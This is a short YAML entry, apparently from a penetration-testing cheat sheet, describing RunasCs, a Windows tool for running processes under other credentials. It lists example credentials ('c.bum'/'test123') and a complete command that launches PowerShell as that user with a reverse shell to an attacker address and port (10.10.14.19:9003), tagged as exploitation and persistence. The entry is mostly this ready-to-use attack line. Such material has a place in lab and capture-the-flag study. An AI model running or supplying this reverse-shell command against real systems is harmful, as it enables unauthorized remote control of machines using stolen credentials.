---
description: |
  RunasCs is an utility to run specific processes with different permissions than the user's current logon provides using explicit credentials. This tool is an improved and open version of windows builtin runas.exe that solves some limitations.

  Command Reference:
  ```
  Username: c.bum

  Password: test123

  Command: Powershell

  Attacker IP & port for reverse shell: 10.10.14.19:9003
  ```
command: |
  .\RunasCs.exe c.bum test123 powershell -r 10.10.14.19:9003

items:
  - Shell
services:
  - 
OS:
  - Windows
attack_types:
  - Exploitation
  - Persistance
references:
  - https://github.com/antonioCoco/RunasCs
---